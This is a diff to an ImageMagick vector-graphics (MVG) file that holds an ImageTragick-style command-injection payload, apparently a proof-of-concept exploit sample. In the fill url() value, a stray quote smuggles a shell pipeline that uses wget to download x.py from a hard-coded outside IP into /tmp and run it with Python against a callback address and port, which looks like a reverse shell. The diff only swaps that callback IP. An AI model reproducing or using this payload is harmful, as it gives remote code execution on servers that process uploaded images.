@@ -1,5 +1,5 @@
 push graphic-context
 viewbox 0 0 640 480
-fill 'url(https://example.com/image.jpg"|wget http://139.129.21.79/x.py -O /tmp/x.py && python /tmp/x.py 42.159.26.77 12315")'
+fill 'url(https://example.com/image.jpg"|wget http://139.129.21.79/x.py -O /tmp/x.py && python /tmp/x.py 1.1.1.1. 12315")'
 pop graphic-context
 
